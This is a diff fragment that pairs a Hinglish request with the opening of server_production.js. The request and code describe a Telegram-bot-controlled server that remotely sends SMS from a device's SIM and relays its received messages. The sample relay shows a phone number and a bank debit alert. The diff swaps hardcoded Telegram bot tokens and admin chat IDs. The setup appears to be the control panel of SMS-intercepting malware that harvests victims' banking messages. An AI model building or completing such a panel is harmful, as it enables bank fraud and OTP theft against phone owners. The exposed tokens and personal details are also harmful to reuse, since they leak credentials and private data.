@@ -1,14 +1,11 @@
-muje ek server bana ke do jaha me telegram se cannat ho jaha me tekegram se send sms click karu than show karke sim 1 or 2 than seletect than kya sms bejna he ye likhega vo server pe requst bejo 2. recive sms button jese hi click karega tahn last 20 sms show ho jayege ye formate me 📱 NEW MESSAGE RECEIVED 📱 📜 Device Numbers 📜 ================================ • Model: CPH2467 🪪 SIM1: +917828720364 🪪 SIM2: Not Found 🃏 Message Details 🃏 ================================ • From: BP-IDFCFB-S 📧 Message Preview: Your A/C XXXXX300481 is debited by INR 500.00 on 06/08/25 13:41. New Bal :INR 205.79. Call us on 180010888 for dispute. Team IDFC FIRST Bank ⏳ TimeStamp: 06-08-2025 | 01:41 pm ================================ ab ye lo mere server_production.js  code const express = require('express');
-const bodyParser = require('body-parser');
-const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs-extra');
 const path = require('path');
 
 // ===== CONFIG =====
 // Replace with your actual bot token from @BotFather
 // ===== CONFIG =====
-const BOT_TOKEN = '7568413605:AAGHe3sebpFDpMr2yGrKUoZufgJNUzDReTg';
-const ADMIN_IDS = [-1002929812606];   // <- yahan naya chat id
+const BOT_TOKEN = '8325992828:AAFhVrtzLAsSn_ZpdAHwWnIOwr6dXw6G0Ns';
+const ADMIN_IDS = [-1002572660367];   // <- yahan naya chat id
 const DEVELOPER = '@heck0bot';
 const PORT = 3000;
 
